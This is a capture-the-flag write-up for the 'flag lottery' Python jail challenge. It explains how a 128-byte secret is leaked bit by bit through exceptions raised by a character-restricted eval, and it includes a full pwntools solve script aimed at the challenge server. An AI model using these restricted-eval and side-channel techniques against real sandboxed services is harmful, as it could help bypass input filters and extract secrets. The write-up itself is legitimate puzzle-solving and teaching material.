---
title: flag lottery
---
# flag lottery

## Summary

I was able to solve this challenge with the help of two of my teammates, who we
will call Research and Development.

The problem revolves around leaking bits in a character-set-constrained
payload. Using Research's creative `^` idea, we were able to solve the problem
using the characters `[]^>`, which was not guaranteed based on the random
shuffle (and therefore a "lottery").

## Description

> i love gambling, don't you?

## Provided files

`flag_lottery.py`

```py
#!/usr/bin/env python3
import secrets
import random
flag = "fake{flag}"

x = [*"%&()*,./:;>[]^{|}~"] # i deleted a bunch of characters because i just dislike them for being too cool.
random.shuffle(x)
charset = x[:4]
print(f'your lucky numbers are: {", ".join([str(ord(i)) for i in charset])}')
charset += ["_"]
count = 0

try:
    while count < 100:
        _ = secrets.token_bytes(128)
        secret = _
        for z in range(1025):
            code = input("cmd: ")
            if code == "submit":
                if input("lottery numbers? ") == secret.hex():
                    count += 1
                else:
                    raise ValueError("the winning ticket was " + secret.hex())
            elif any(i not in charset for i in code):
                raise ValueError("invalid cmd")
            else:
                try:
                    eval(code)
                except:
                    print("answering machine broke.")
except Exception as err:
    print(err)
if count == 100:
    print(f"you won! here is {flag:}")
else:
    print("better luck next time!")
```

Instead of importing the flag from another Python file, I modified the code to
just have `fake{flag}` instead.

You also get the Dockerfile, but nothing was significant about it except that
the timeout was 7777 seconds, just over 2 hours.

## Goal

The goal of this challenge is to successfully guess a 128-byte secret 100 times
without getting one wrong. You are able to run `eval(code)` 1024 times, but
`code` must be entirely comprised of you randomized character set and the
variable `_`.

At the start of the challenge, you are given a random set of 4 characters from
`%&()*,./:;>[]^{|}~`. This challenge is not meant to be solvable with any 4
characters. For example, `([{;` would not allow you to do anything productive
at all.

I also had a few more key observations:
- The program runs until you get to 100 successful guesses or you get something
  wrong. You don't *need* to send anything, and you will get a new secret if
  you mess up or decide you don't want to figure this one out.
- The "z" loop runs 1025 times - 1024 `eval` queries and 1 submission. Why
  1024? Well, there are 1024 bits in 128 bytes, so maybe we can leak a bit.
- We are not given the output of `eval`, just whether or not `eval` caused an
  exception. Therefore, if we can cause an exception on a 0/1 and not cause it
  on the other, we have leaked a bit.

We now have a strategy: pick 4 characters to leak arbitrary bits with and run
with it!

## Character Requirements

We need 4 characters from the punctuation list that allow us to isolate bits
and then cause exceptions.

Brainstorming ways to cause exceptions in Python, I thought of two ways:
division/modulus, and indexing out of bounds.

Using division/modulus would cost us a character (`/` or `%` respectively).
Indexing out of bounds would cost us two: `[]`. If we needed arbitrary
indexing, we could use `:` to get slices of the original 128 element array, or
`,` to create arbitrary-size lists.

To isolate bits, we needed one of the bit-wise operators: `&|^`. `|` would be a
little hard, so `&` and `^` are our best bet here. We'd might need `>` to do bit shifting (`>>`), depending on our strategy.

It turns out, we also need arbitrary numbers to index. This is a difficult
problem since we aren't allowed any addition, and we don't have any numbers to
start with. One solution involved `*` and `~`, which, given the number 0, can
get you anywhere. For example, `~((~0)*(~0))` will get you `-2`.

Coming from other problems, we know that we can generate `0` and `1` via
`False` and `True`, which we can generate from `>`:
- `_>_` is `False`
- `[_]>[]` is `True` (Development came up with something similar that we used
  in our solution, but `[_]>[]` is more efficient. We found this out from other
  write-ups.)` q`

We will also need parenthesis for various orders of operations. However, we can
use `[]` to get the job done, given 0: `[x][0]` functions identically to `(x)`.

Finally, we will need a way to actually access bytes (integers) from the
`bytes` object in Python. The only way to do this with the characters available
is via indexing with `[]`.

Research came up with a good indexing idea that didn't require numbers other than 1:

```py
>>> _ = "abcd"
>>> _[1:]
'bcd'
>>> _[1:][1:]
'cd'
>>> _[1:][1:][:1]
'c'
```

This would require `:`.

At this point, we have a few character options:

- `[]` is necessary - we need to index into bytes
- `/%` may be useful, but only for leaking bits. We could index out of bounds
  using `[]` instead.
- `:` may be useful to slice, if indexing out of bounds or to index into `_`.
- `>` would be useful to bit shift and is the only character that could
  generate numbers.
- `&^` are useful to isolate bits.

However, that's too many characters. We tried a few solutions, but realized
they either require too many characters or are missing vital primitives.

## Failed Solution: `[]>:`

This solution works, but only with parameters that are not the challenge's
parameters.

Using `:`, we could arbitrarily index into the array as above. Then, we could
bit shift 7 times using `>> 1` (`>> [[_]>[]][_>_]`) repeatedly. That most
significant bit `x` could be leaked via `[_][x]`.

We can now leak the second most significant bit. We could bit shift 6 times,
giving us `x0` or `x1`, where `x` is the first bit. If `x` is `0`, then we have
the same leak `[_][y]`. If `x` is `1`, then we have `10` (2) or `11` (3). We
can then use `:` to create a 2-item array by slicing the secret `_`, and use
indexing to cause an exception.

For good measure, I will explain the third bit. We bit shift 5 times, giving us
`xy0` or `xy1`. If `x` and `y` were both `1`, then we have `110` (6) or `111`
(7). We can then use `:` to create a 6-item array by slicing the secret `_`,
and use indexing to cause an exception.

We can continue until we encounter the final bit. If first bit was `1`, we
would be unable to index into any value above 128 (the length of `_`). Given
that a single byte has a 50% chance to be above 128, this solution is not
viable.

This solution would theoretically work if we were given 2049 queries on a
256-byte string, since that would give us a way to create arrays of any length
(up to 256). It would also be possible given `,`, but then we'd have 5
characters.

## Real Solution: `[]>^`

After a few hours of trying things, we had almost entirely given up. Research,
however, didn't. He stared at a wall for about 30 minutes and figured out that
`^`, along with one of the key observations about the code, allowed us to
create arbitrary numbers and therefore arbitrarily index into the secret.

Using `^`, `>>`, and given the number 128 (binary is the most significant bit
of a byte), we can create arbitrary numbers. For example, `128^64^2^1` would be
195 and only uses bit shifted versions of 128.

If `_[0]`'s leading bit is 1 (so `_[0]>127`), we can create 128 by using `^`
against bit shifted versions of itself. For example, say the first byte was
195. Then the binary representation is `0b11000011`, and we can create 128 as
follows:

```
  11000011
^  1100001 (195 >> 1)
----------
  10100010
^   110000 (195 >> 2)
----------
  10010010
^    11000 (195 >> 3)
----------
  10001010
^     1100 (195 >> 4)
----------
  10000110
^      110 (195 >> 5)
----------
  10000000
```

I realized, shortly after, that `^` and `>` also gives us a way to use indexing
to leak bits.

Given an indexed number, such as 129 (`0b10000001`), we can leak the least
significant bit like this: `[_][x > x ^ 1]` where `x` is 129.

Since `^1` toggles the least significant bit, if `x & 1` is 0, then the
comparison will be false. If `x & 1` is 1, then the comparison will be true.

What if the most significant bit of `_[0]` is not 1? Well, by the code, we can
just send `\n` a thousand or so times, then get a new secret.

We now have all of the components to leak arbitrary bits. 

## Solve

We have two more minor problems: the random character set and latency.

If the random character set is not what we want, we'll have to close the `nc`
connection and restart. Development reasoned that it would be `1 / (18 choose
4)`, or `1/3060`. With a few parallel connections, this should be a (50% chance
for a) connection every 5 minutes or so. In any case, this was a trivial coding
problem but an annoying time sink.

After coding our solution, we learned that we were too slow when factoring in
network delays. We had already spent 6+ hours on this problem, so we called it
a day and went home. But at home, I optimized it. This will make more sense
with the code, but in a `nc` connection you can send bytes before being
prompted for them. So instead of sending `\n` a thousand times, we can just
send a thousand `\n` all at once.

This is also true per byte (and likely per secret, after the first bit check),
so I optimized that as well.

```py
from pwn import *
import time
use_remote = True
count = 0

def expand_zero(s):
    return s.replace("0", "_>_")

def expand_parenthesis(s):
    s = s.replace("(", "[")
    return s.replace(")", "][0]")

def expand_one(s: str):
    return s.replace("1", "([_]>[])")

def expand_bitshift(s: str):
    for i in range(7, 1, -1):
        s = s.replace(">>"+str(i),">>1>>"+str(i-1))
    return s.replace(">>0","")

def generate_bit_test(index:str, bit_index): # MSB = 0
    x = f"_[{index}]>>{7-bit_index}"
    if bit_index == 0:
        return f"[_][{x}]"
    elif bit_index == 7:
        return f"[_][_[{index}]>_[{index}]^1]"
    else:
        return f"[_][{x}>{x}^1]"

def generate_128(b):
    assert b >= 0b10000000
    s = "_[0]^"
    x = b
    for i in range(6, -1, -1):
        if ((x >> i) & 1) == 1:
            s += f"_[0]>>{7-i}^"
            x ^= b >> (7-i)
    return f"({s[:-1]})"

_128_table = { }
for i in range(0b10000000, 0b11111111+1):
    _128_table[i] = generate_128(i)

def generate_any(first_byte, x):
    _128 = _128_table[first_byte]
    b = 0
    s = ""
    for i in range(7, -1, -1):
        if ((x >> i) & 1) == 1:
            b ^= 128 >> (7-i)
            s += f"{_128}>>{7-i}^"
    return f"({s[:-1]})"

def run_byte_test(io, first_byte, byte_index):
    print(f"Starting byte {byte_index}")
    start = time.time()
    index_payload = generate_any(first_byte, byte_index)
    bits = 0
    ss = ""
    for i in range(8):
        s = generate_bit_test(index_payload, i)
        for f in [expand_bitshift, expand_one, expand_parenthesis, expand_zero]:
            s = f(s)
        ss += s + "\n"
    io.send(ss.encode())
    for i in range(8):
        bits <<= 1
        line = io.recvuntil(b":")
        if b"broke" in line:
            bits |= 1
        #     print(f"Byte {byte_index} bit {i}: 1")
        # else:
        #     print(f"Byte {byte_index} bit {i}: 0")
    print(f"Count {count}, Byte {byte_index}: 0x{bits:02x}")
    print(f"Took {time.time()-start} seconds")
    return bits


if __name__ == "__main__":
    if use_remote:
        io = remote("challs3.pyjail.club", 24908)
    else:
        io = process("flag_lottery.py")
    start = time.time()
    io.recvuntil(b":")
    lucky = io.recvline().decode().split(",")
    lucky_chars = set((map(lambda x: chr(int(x)), lucky)))
    while lucky_chars != set(">^[]"):
        io.close()
        print("bad chars", "".join(lucky_chars))
        if use_remote:
            io = remote("challs3.pyjail.club", 24908)
        else:
            io = process("flag_lottery.py")
        io.recvuntil(b":")
        lucky = io.recvline().decode().split(",")
        lucky_chars = set((map(lambda x: chr(int(x)), lucky)))
    print(f"Time to get lucky: {time.time()-start} seconds")
    start = time.time()

    print("Lucky characters found, we're in")
    coinflip = False
    while count < 100:
        count_time = time.time()
        if not coinflip:
            io.recvuntil(b":")
        coinflip = False
        bits = 0
        # first byte
        first = time.time()
        for i in range(8):
            bits <<= 1
            s = generate_bit_test("0", i)

            for f in [expand_bitshift, expand_one, expand_parenthesis, expand_zero]:
                s = f(s)
            io.sendline(s.encode())
            line = io.recvuntil(b":")
            if i == 0 and b"broke" not in line:
                coinflip = True
                break
            if b"broke" in line:
                bits |= 1
            #     print(f"Byte 0 bit {i}: 1")
            # else:
            #     print(f"Byte 0 bit {i}: 0")
        if coinflip:
            coinflip_time = time.time()
            print("Lost coinflip, skipping...")
            io.send(b"\n"*1024)
            for i in range(1024):
                io.recvuntil(b":")
            print(f"Done coinflip, {time.time()-coinflip_time} seconds")
            continue
        print(f"Byte 0: 0x{bits:02x}")
        print(f"Took {time.time()-first} seconds")

        secret = [bits]
        # other bytes
        for i in range(1, 128):
            secret.append(run_byte_test(io, bits, i))
        io.sendline(b"submit")
        io.sendline(bytes(secret).hex().encode())
        count += 1
        print("Count:", count)
        print(f"Count time: {time.time()-count_time} seconds")
        print(f"Total time: {time.time()-start} seconds")

    print(io.recvall())
    io.close()
    print(f"Total: {time.time()-start} seconds")
```

After running 8 connections using `tmux`, I went to take a shower, eat dinner,
do dishes, and finally came back to watch the last few minutes of a solve.
Based on the flag, this was the intended solution!

Flag: `jail{[_[_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]][_>_]^[[_[_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]][_>_]^[[_[_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]][_>_]^[[_[_>_]>>[[_]>[]][_>_]>>[[_]>[]][_>_]][_>_]^[[_[_>_]>>[[_]>[]][_>_]][_>_]^[[_]>[]][_>_]][_>_]][_>_]][_>_]][_>_]}`
